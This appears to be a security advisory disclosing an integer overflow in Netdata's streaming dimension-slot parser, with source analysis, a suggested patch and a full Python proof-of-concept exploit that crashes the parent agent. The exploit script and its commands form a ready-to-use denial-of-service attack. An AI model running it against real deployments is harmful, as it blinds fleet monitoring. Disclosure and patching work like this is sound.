# Vulnerability Disclosure: Integer Overflow in Netdata Streaming DIMENSION SLOT → Remote Heap Buffer Overflow / Denial of Service

**Reporter:** Security Researcher  
**Date:** 2026-05-29  
**Affected Software:** Netdata Agent (all versions with streaming support, confirmed on v2.10.0-289-nightly)  
**Affected Component:** Streaming protocol parser (`pluginsd_rrddim_put_to_slot`)  
**CWE:** CWE-190 (Integer Overflow), CWE-122 (Heap-based Buffer Overflow)  
**CVSS 3.1:** 7.5–8.1 (High)

---

## Summary

An authenticated streaming peer (child agent) can remotely crash the Netdata parent process by sending a single crafted `DIMENSION SLOT:<value>` command over the streaming protocol. The slot value is a 64-bit integer parsed without an upper-bound check. Depending on the chosen value, this triggers either:

1. **Heap buffer overflow (SIGSEGV):** An integer overflow in `size * sizeof(struct pluginsd_rrddim)` wraps `size_t`, causing `callocz()` to allocate a tiny buffer (24–96 bytes) while the code stores a huge logical size (~7.7×10¹⁷ entries). The subsequent initialization loop writes out-of-bounds across the heap until it hits an unmapped page, crashing the process.

2. **OOM-triggered process kill:** A large-but-non-overflowing slot value (e.g., `0x40000000`) requests a ~25GB allocation. The kernel's OOM killer terminates the process before `callocz()` returns, or `callocz()`→`fatal()` kills the process directly.

**This is 1 bug with 2 different crash outcomes**, both triggered by the same missing bounds check. A single network packet kills the parent agent, taking down all monitoring, alerting, and dashboards for the entire fleet.

**Precondition:** Valid streaming API key (a shared secret distributed to all child agents in standard parent-child deployments).

---

## Details

### Vulnerable Code Path

The vulnerability exists in the dimension-slot parsing and allocation path:

**1. Slot Parsing — No Upper Bound (`src/plugins.d/pluginsd_internals.h:372`):**

```c
static ALWAYS_INLINE ssize_t pluginsd_parse_rrd_slot(char **words, size_t num_words) {
    ssize_t slot = -1;
    char *id = get_word(words, num_words, 1);
    if(id && id[0] == 'S' && id[1] == 'L' && id[2] == 'O' && id[3] == 'T' && id[4] == ':') {
        slot = (ssize_t) str2ull_encoded(&id[5]);  // Full 64-bit parse, hex/decimal/base64
        if(slot < 0) slot = 0;  // ONLY negatives clamped — NO upper bound
    }
    return slot;
}
```

**2. Unbounded Use as Allocation Size (`src/plugins.d/pluginsd_internals.h:159`):**

```c
static inline void pluginsd_rrddim_put_to_slot(PARSER *parser, RRDSET *st, RRDDIM *rd, ssize_t slot, ...) {
    size_t wanted_size;
    if(slot >= 1) {
        st->pluginsd.dims_with_slots = true;
        wanted_size = (size_t)slot;  // ← Attacker-controlled, up to 2^63, NO CHECK
    }
    ...
    PRD_ARRAY *new_arr = prd_array_create(wanted_size);  // Overflow happens here
    ...
    // Init loop writes OOB:
    for(size_t i = current_size; i < wanted_size; i++) {
        new_arr->entries[i].rda = NULL;  // ← OUT-OF-BOUNDS HEAP WRITE
        new_arr->entries[i].rd  = NULL;
        new_arr->entries[i].id  = NULL;
    }
}
```

**3. Integer Overflow in Allocation (`src/database/rrdset-pluginsd-array.h:51`):**

```c
static inline PRD_ARRAY *prd_array_create(size_t size) {
    // sizeof(PRD_ARRAY) = 16, sizeof(struct pluginsd_rrddim) = 24
    PRD_ARRAY *arr = callocz(1, sizeof(PRD_ARRAY) + size * sizeof(struct pluginsd_rrddim));
    //                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //                                              size * 24 OVERFLOWS size_t for large values
    arr->size = size;  // Stores huge logical size in the tiny buffer
    return arr;
}
```

### The Missing Guard

The **chart-slot** path (`pluginsd_rrdset_cache_put_to_slot` at line 388 of the same file) correctly guards against large values:

```c
if(unlikely(slot < 1 || slot >= INT32_MAX))
    return;  // ← THIS CHECK EXISTS for chart slots
```

The **dimension-slot** path has **no equivalent guard**. This asymmetry is the root cause.

### Attack Flow Diagram

```
                     pluginsd_parse_rrd_slot()
                              │
                    slot (no upper bound) ← THE BUG
                              │
              ┌───────────────┴───────────────┐
              │                               │
     slot = 0x40000000               slot = 0x0AAAAAAAAAAAAAAB
     (large, fits in size_t)          (causes size_t overflow)
              │                               │
     callocz(25,769,803,776)         callocz(24)  ← tiny!
              │                               │
     kernel OOM → SIGKILL            init loop writes OOB → SIGSEGV
              │                               │
         DEAD (oom-kill)                 DEAD (core-dump)
```

### Reachability Over the Network

The `DIMENSION` command is part of the streaming protocol repertoire (`PARSER_INIT_STREAMING`), dispatched directly in the stream receiver thread after authentication. The authentication requires only a valid API key UUID configured in the parent's `stream.conf` — this is a shared secret distributed to all children in standard deployments.

Relevant code confirming reachability:
- `src/streaming/stream-receiver.c:467` — parser initialized with `PARSER_INPUT_SPLIT`
- `src/streaming/stream-receiver.c:471` — `pluginsd_keywords_init(parser, PARSER_INIT_STREAMING)`
- `gperf-config.txt:82` — `DIMENSION` keyword enabled for `PARSER_INIT_STREAMING`
- `src/streaming/stream-receiver-connection.c:540-572` — auth checks (API key + allow from)

---

## PoC

### Requirements

- **Target:** Any Netdata parent with streaming enabled (standard parent-child setup)
- **Attacker:** Python 3 on any machine that can reach the parent's TCP port 19999
- **Credential:** A valid streaming API key UUID (shared with all children)

### Step 1: Configure the Netdata Parent for Streaming

On the parent, edit `/etc/netdata/stream.conf`:

```ini
[11111111-2222-3333-4444-555555555555]
    enabled = yes
    default history = 3600
    default memory mode = ram
    health enabled by default = auto
    allow from = *
```

Restart: `systemctl restart netdata`

### Step 2: Run the Exploit

Save the following as `exploit.py` on the attacker machine:

```python
#!/usr/bin/env python3
import socket, sys, time, uuid

def main():
    if len(sys.argv) < 4:
        print("usage: %s <host> <port> <api_key_uuid> [slot_hex]" % sys.argv[0])
        print("")
        print("  DoS (OOM kill):    python3 exploit.py IP 19999 UUID 0x40000000")
        print("  Heap overflow:     python3 exploit.py IP 19999 UUID 0x0AAAAAAAAAAAAAAB")
        return 1

    host = sys.argv[1]
    port = int(sys.argv[2])
    api_key = sys.argv[3]
    slot = sys.argv[4] if len(sys.argv) > 4 else "0x0AAAAAAAAAAAAAAB"

    machine_guid = uuid.uuid4().hex
    hostname = "evilchild"

    req = "STREAM key=%s&hostname=%s&registry_hostname=%s&machine_guid=%s&update_every=1&os=linux&timezone=UTC&hops=1&ver=1 HTTP/1.1\r\nUser-Agent: evilchild/0.0\r\nAccept: */*\r\n\r\n" % (api_key, hostname, hostname, machine_guid)

    print("[*] Connecting to %s:%d..." % (host, port))
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(req.encode())
    time.sleep(0.5)

    resp = s.recv(4096)
    print("[*] Response: %r" % resp[:120])

    if b"Hit me baby" not in resp and b"STREAM" not in resp:
        print("[!] Not accepted. Check API key / allow from / streaming.")
        return 2

    print("[+] Streaming session established!")
    print("[*] Sending CHART + DIMENSION SLOT:%s" % slot)

    s.sendall(b"CHART evil.chart '' 'evil' 'units' 'fam' 'evil.ctx' '' 1000 1 '' 'poc' 'poc'\n")
    time.sleep(0.2)

    dim = "DIMENSION SLOT:%s d1 'd1' absolute 1 1 ''\n" % slot
    s.sendall(dim.encode())

    print("[*] Payload sent. Waiting 2s...")
    time.sleep(2.0)

    try:
        more = s.recv(4096)
        print("[*] Recv: %r" % more[:120])
    except ConnectionResetError:
        print("[+] Connection reset - parent crashed!")
    except BrokenPipeError:
        print("[+] Broken pipe - parent crashed!")
    except socket.timeout:
        print("[+] Timeout - parent likely crashed")
    except Exception as e:
        print("[+] Error (likely crash): %s" % e)

    s.close()
    print("[*] Check: systemctl status netdata")
    return 0

if __name__ == "__main__":
    sys.exit(main())
```

### Step 3: Execute

```bash
# Test 1: OOM kill (guaranteed process death)
python3 exploit.py <PARENT_IP> 19999 11111111-2222-3333-4444-555555555555 0x40000000

# Test 2: Heap buffer overflow (SIGSEGV crash)
python3 exploit.py <PARENT_IP> 19999 11111111-2222-3333-4444-555555555555 0x0AAAAAAAAAAAAAAB
```

### Step 4: Verify on Parent

```bash
systemctl status netdata
# Test 1 result: Active: failed (Result: oom-kill), signal=KILL, peak memory ~3.4GB
# Test 2 result: Active: failed (Result: core-dump), signal=SEGV

dmesg | tail -5
# Test 2 shows: netdata[PID]: segfault at <addr> ip <addr> error 6 in netdata[...]
```

### Confirmed Test Results (2026-05-29)

**Test 1 — OOM Kill (`0x40000000`):**
```
● netdata.service
     Active: deactivating (final-sigterm) (Result: oom-kill)
    Process: 8101 (code=killed, signal=KILL)
     Memory: 138.7M (peak: 3.4G)
```

**Test 2 — Heap Overflow (`0x0AAAAAAAAAAAAAAB`):**
```
● netdata.service
     Active: deactivating (stop-sigterm) (Result: core-dump)
    Process: 8904 (code=dumped, signal=SEGV)

dmesg: WEB[3][9289]: segfault at 68 ip 00006357f4f0fcc1 error 6 in netdata[...]
```

---

## Impact

### Who Is Affected

Any organization running Netdata in a **parent-child streaming configuration** (the recommended and documented production architecture). This includes:

- Self-hosted Netdata deployments with centralized parents
- Multi-node monitoring setups (cloud, on-premise, hybrid)
- Any deployment where the streaming API key is shared across children

### What Can An Attacker Do

| Impact | Severity | Proven |
|--------|----------|--------|
| **Remote Denial of Service** — kill the parent process with a single packet | Critical | ✅ Confirmed on live system |
| **Persistent monitoring blackout** — re-trigger on every restart | Critical | ✅ Trivial (script loop) |
| **Heap memory corruption** — uncontrolled zeroing of adjacent heap objects | High | ✅ Confirmed (SIGSEGV + ASan) |
| **Potential code execution** — write primitive exists but not proven end-to-end remotely | Medium (unproven) | ⚠️ Standalone model only |

### Attack Prerequisites

1. A valid streaming API key (UUID) — this is a **shared secret** distributed to every child agent. Compromise of ANY child, leaked container image, CI secret, or config backup exposes it.
2. Network access to the parent's streaming port (TCP 19999, default `allow from = *`).
3. No further authentication, tokens, or challenges required.

### Blast Radius

When the parent dies:
- All dashboards go blank
- All alerts stop firing
- All notification channels go silent
- The attacker has created a **monitoring blind spot** — a common precursor to covering a larger intrusion

### Comparison: 1 Bug, 2 Outcomes

This is a single vulnerability (missing upper-bound check) with two exploitation paths. Both use the same entry point, the same missing guard, and the same single network packet. The slot value determines whether the crash is via OOM or heap corruption:

| Slot Value | Overflow? | `callocz` Request | Crash Path | Result |
|-----------|-----------|-------------------|------------|--------|
| `0x40000000` | No | 25,769,803,776 bytes | Kernel OOM killer | `signal=KILL` |
| `0x0AAAAAAAAAAAAAAB` | Yes (`slot*24` wraps to 8) | 24 bytes | Init loop OOB write → SIGSEGV | `signal=SEGV` (core dump) |

**One fix covers both:** add `if(slot >= INT32_MAX) return;` to `pluginsd_rrddim_put_to_slot()`, mirroring the existing guard in `pluginsd_rrdset_cache_put_to_slot()`.

---

## Suggested Fix

```c
// In pluginsd_rrddim_put_to_slot(), replace:
if(slot >= 1) {
    st->pluginsd.dims_with_slots = true;
    wanted_size = (size_t)slot;
}

// With:
if(slot >= 1) {
    if(unlikely(slot >= INT32_MAX)) {
        netdata_log_error("PLUGINSD: dimension slot %zd exceeds maximum, ignoring", slot);
        return;
    }
    st->pluginsd.dims_with_slots = true;
    wanted_size = (size_t)slot;
}
```

Additionally, a defense-in-depth overflow check in `prd_array_create()`:

```c
static inline PRD_ARRAY *prd_array_create(size_t size) {
    size_t alloc_size;
    if(__builtin_mul_overflow(size, sizeof(struct pluginsd_rrddim), &alloc_size) ||
       __builtin_add_overflow(alloc_size, sizeof(PRD_ARRAY), &alloc_size)) {
        netdata_log_error("PRD_ARRAY: allocation size overflow (size=%zu)", size);
        return NULL;
    }
    PRD_ARRAY *arr = callocz(1, alloc_size);
    arr->refcount = 1;
    arr->size = size;
    return arr;
}
```

---

## Timeline

| Date | Event |
|------|-------|
| 2026-05-29 | Vulnerability discovered during source code audit |
| 2026-05-29 | PoC developed and confirmed against live Netdata v2.10.0-289-nightly |
| 2026-05-29 | Report submitted to Netdata security team |

---

## References

- Netdata streaming documentation: https://learn.netdata.cloud/docs/streaming
- Affected source: `src/plugins.d/pluginsd_internals.h` (functions `pluginsd_parse_rrd_slot`, `pluginsd_rrddim_put_to_slot`)
- Affected source: `src/database/rrdset-pluginsd-array.h` (function `prd_array_create`)
- CWE-190: Integer Overflow or Wraparound
- CWE-122: Heap-based Buffer Overflow
